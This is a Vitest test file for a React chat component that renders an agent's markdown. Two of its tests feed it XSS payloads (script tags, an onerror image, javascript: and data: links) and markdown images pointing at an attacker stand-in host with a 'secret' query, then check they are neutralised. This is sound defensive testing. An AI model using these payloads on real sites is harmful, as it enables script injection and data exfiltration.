// @vitest-environment jsdom
import {
  AssistantRuntimeProvider,
  type ThreadMessageLike,
  ThreadPrimitive,
  useExternalStoreRuntime,
} from "@assistant-ui/react";
import { cleanup, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { TooltipProvider } from "@/components/ui/tooltip";
import { AssistantMessage } from "./thread.aui";

afterEach(cleanup);

/** Renders `text` as an agent message through the real message component (no viewport). */
function Harness({ text, createdAt }: { text: string; createdAt?: Date }) {
  const message: ThreadMessageLike = {
    id: "msg-1",
    role: "assistant",
    content: [
      // who ran (the marker ThreadAgent puts in front of an invocation's output)
      ...(createdAt
        ? [{ type: "data" as const, name: "vymalo.actor", data: { type: "agent", name: "coder" } }]
        : []),
      { type: "text", text },
    ],
    status: { type: "complete", reason: "stop" },
    ...(createdAt ? { createdAt } : {}),
  };
  const runtime = useExternalStoreRuntime<ThreadMessageLike>({
    messages: [message],
    convertMessage: (m) => m,
    isRunning: false,
    onNew: async () => {},
  });
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <TooltipProvider>
        <ThreadPrimitive.Root>
          <div role="log" aria-label="Conversation">
            <ThreadPrimitive.Messages>{() => <AssistantMessage />}</ThreadPrimitive.Messages>
          </div>
        </ThreadPrimitive.Root>
      </TooltipProvider>
    </AssistantRuntimeProvider>
  );
}

async function renderAgentText(text: string): Promise<HTMLElement> {
  render(<Harness text={text} />);
  const log = await screen.findByRole("log", { name: "Conversation" });
  await waitFor(() => expect(log.querySelector(".aui-md")).not.toBeNull());
  return log;
}

describe("MarkdownText", () => {
  it("renders markdown (sanity check for the tests below)", async () => {
    const log = await renderAgentText("**bold** and a [link](https://example.com/x)");
    expect(log.querySelector("strong")?.textContent).toBe("bold");
    const link = log.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/x");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("agent markdown cannot inject script or javascript: links", async () => {
    const log = await renderAgentText(
      [
        "<script>window.__pwned = 1</script>",
        '<img src=x onerror="window.__pwned = 2">',
        '<a href="javascript:window.__pwned=3">raw html link</a>',
        "[markdown link](javascript:window.__pwned=4)",
        "[data link](data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=)",
      ].join("\n\n"),
    );
    expect(log.querySelector("script")).toBeNull();
    expect(log.querySelector("img")).toBeNull();
    // raw HTML is shown as text, never parsed: no element carries an event-handler attribute
    for (const el of log.querySelectorAll("*")) {
      const handlers = el.getAttributeNames().filter((n) => n.startsWith("on"));
      expect(handlers, `<${el.localName}> attributes`).toEqual([]);
    }
    expect(log.textContent).toContain("<script>window.__pwned = 1</script>");
    for (const a of log.querySelectorAll("a")) {
      const href = a.getAttribute("href") ?? "";
      expect(href, `href of "${a.textContent}"`).not.toMatch(/^\s*(javascript|data|vbscript):/i);
    }
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("an image is never fetched: its alt text, and a link only for an http(s) URL", async () => {
    const log = await renderAgentText(
      [
        "![the diagram](https://evil.example/p.png?d=secret)",
        "![](https://evil.example/q.png)",
        "![bad](javascript:window.__pwned=5)",
        "[![nested](https://evil.example/r.png)](https://example.com/page)",
      ].join("\n\n"),
    );
    expect(log.querySelector("img, picture, source, image")).toBeNull();
    expect(document.querySelector('link[rel="preload"], link[rel="prefetch"]')).toBeNull();
    const link = [...log.querySelectorAll("a")].find((a) => a.textContent?.includes("the diagram"));
    expect(link?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    // no alt text: it is still said to be an image
    expect(log.textContent).toContain("image");
    // a script URL is no link
    for (const a of log.querySelectorAll("a")) {
      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
    }
    expect(log.textContent).toContain("bad");
    // an image inside a link is its text, inside the one link
    const page = [...log.querySelectorAll("a")].find(
      (a) => a.getAttribute("href") === "https://example.com/page",
    );
    expect(page?.textContent).toContain("nested");
    expect(page?.querySelector("a")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("a fenced block is highlighted by its language, and says the same text", async () => {
    const source = 'fn main() {\n    println!("hi");\n}';
    const log = await renderAgentText(`Here:\n\n\`\`\`rust\n${source}\n\`\`\`\n`);
    const code = () => log.querySelector("pre code") as HTMLElement;
    expect(code().textContent).toBe(`${source}\n`);
    await waitFor(() => expect(code().querySelector("[data-token]")).not.toBeNull(), {
      timeout: 5000,
    });
    expect(code().textContent).toBe(`${source}\n`);
    expect(log.querySelector(".aui-code-header-language")?.textContent).toBe("rust");
  });

  it("a fence of an unknown language, and one with none, stay plain text", async () => {
    const log = await renderAgentText("```brainfuck\n+++[>+<-]\n```\n\n```\nplain words\n```\n");
    await new Promise((r) => setTimeout(r, 300));
    const blocks = [...log.querySelectorAll("pre code")];
    expect(blocks.map((b) => b.textContent)).toEqual(["+++[>+<-]\n", "plain words\n"]);
    for (const block of blocks) expect(block.querySelector("[data-token]")).toBeNull();
  });

  it("a fence that is still open (a streaming answer) renders", async () => {
    const log = await renderAgentText("```rust\nfn main() {");
    expect(log.querySelector("pre code")?.textContent?.trimEnd()).toBe("fn main() {");
  });

  it("inline code is not highlighted", async () => {
    const log = await renderAgentText("call `fn main()` now");
    await new Promise((r) => setTimeout(r, 300));
    const code = log.querySelector(".aui-md-inline-code");
    expect(code?.textContent).toBe("fn main()");
    expect(code?.querySelector("[data-token]")).toBeNull();
  });

  it("display math is drawn by KaTeX and has a name a screen reader reads", async () => {
    const log = await renderAgentText("The energy:\n\n$$\nE = mc^2\n$$\n");
    const math = await waitFor(() => {
      const el = log.querySelector<HTMLElement>('.katex-display[role="math"]');
      expect(el).not.toBeNull();
      return el as HTMLElement;
    });
    expect(math.getAttribute("aria-label")).toBe("E = mc^2");
    expect(math.querySelector("math")).not.toBeNull();
  });

  it("inline math with double dollars is drawn, and a failing formula is shown, not thrown", async () => {
    const log = await renderAgentText("so $$x^2$$ here, and $$\\frac{$$ there");
    await waitFor(() => expect(log.querySelectorAll(".katex").length).toBeGreaterThan(0));
    expect(log.textContent).toContain("here");
    expect(log.textContent).toContain("there");
  });

  it("dollar prices are not read as math", async () => {
    const log = await renderAgentText("It costs $5 or $10, and $20 more later.");
    expect(log.querySelector(".katex")).toBeNull();
    expect(log.textContent).toContain("It costs $5 or $10, and $20 more later.");
  });

  it("the time of a turn is text a screen reader reaches, not only a tooltip", async () => {
    const at = new Date("2026-09-30T10:00:00Z");
    render(<Harness text="hello" createdAt={at} />);
    const log = await screen.findByRole("log", { name: "Conversation" });
    await waitFor(() =>
      expect(log.querySelector("[data-slot='message-time'] time")).not.toBeNull(),
    );
    const time = log.querySelector("[data-slot='message-time'] time") as HTMLTimeElement;
    expect(time.getAttribute("datetime")).toBe(at.toISOString());
    expect(time.textContent).toBe(at.toLocaleString());
    expect(time.closest(".sr-only")).not.toBeNull();
  });
});
